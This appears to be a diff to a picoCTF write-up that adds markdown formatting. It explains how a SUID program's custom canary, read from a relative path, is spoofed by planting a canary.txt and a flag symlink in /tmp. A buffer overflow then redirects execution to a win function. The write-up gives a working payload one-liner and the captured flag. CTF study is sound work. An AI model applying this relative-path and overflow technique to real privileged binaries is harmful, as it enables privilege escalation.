@@ -1,3 +1,5 @@
+## exploit
+```C
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -75,19 +77,20 @@ int main(int argc, char **argv){
   return 0;
 }
 
-
+```
 
 In vuln function there's a sort of canary that will be checked before ret.
 This canary is read from canary.txt file without specifying absolute path.
 
 Export PATH with working directory in order to call vuln program from every directory.
 
-Then place in a /tmp directory a canary.txt file with simply "aaaa" as content and a symbolic link to the flag.
+Then place in a `/tmp` directory a `canary.txt` file with simply `aaaa` as content and a symbolic link to the flag.
 
 In this tmp dir is possible call suid program without specifing path and the canary value will be taken from my file, so here I can perform a simple BO in order to overwrite RA and execute win function.
  
 
 
-
-command: python -c 'print "56\n"+"a"*32+"aaaa"+"\xeb\x86\x04\x08"*6' | ./vuln
-flag: picoCTF{eT_tU_bRuT3_F0Rc3_58bc7747}
+```bash
+$ python -c 'print "56\n"+"a"*32+"aaaa"+"\xeb\x86\x04\x08"*6' | ./vuln
+```
+##### flag: picoCTF{eT_tU_bRuT3_F0Rc3_58bc7747}
